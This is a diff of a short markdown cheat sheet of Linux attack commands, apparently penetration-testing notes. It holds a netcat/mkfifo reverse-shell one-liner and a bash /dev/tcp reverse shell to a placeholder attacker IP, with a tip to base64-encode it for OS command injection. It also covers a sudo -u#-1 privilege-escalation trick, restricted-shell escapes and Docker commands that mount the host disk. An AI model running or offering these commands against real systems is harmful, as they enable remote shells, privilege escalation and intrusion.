@@ -1,5 +1,7 @@
 # Linux
+
 ## Important files (Default Location)
+
 ```
 /etc/passwd
 /etc/group
@@ -18,6 +20,7 @@
 ```
 
 ### PrivEsc
+
 ```
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [IP_ADDR] [PORT] >/tmp/f
 sudo -l   # /etc/sudoers
@@ -26,28 +29,38 @@ sudo -u#-1 /bin/bash
 ```
 
 ### Reverse Shell
+
 ```
 echo "bash -i >& /dev/tcp/[IP_ADDR]/[PORT] 0>&1" |bash    # base64 encode the echo cmd; use for os command injection (api)
 ```
 
 ### Not So Important But May Be Useful (Default Location)
+
 ```
 /proc/cpuinfo
 ```
 
 ### PATH & Restricted Shell
+
 ```
 export PATH=/tmp:$PATH
 ssh alfred@10.11.1.101 -t "bash --noprofile"
 ```
 
 ### Docker
-```
+
+```shell
+docker images
 docker build -t [image-name] [Dockerfile location]    # building a docker image from the image file
 docker run [image-name]   # running the docker image
+---------------Mount SDA1----------------
+fdisk -l
+mkdir -p /mnt/tmpp
+mount /dev/sda1 /mnt/tmpp
 ```
 
 ### Network & Firewall rules
+
 ```
 iptables -L
 cat /etc/sysconfig/iptables
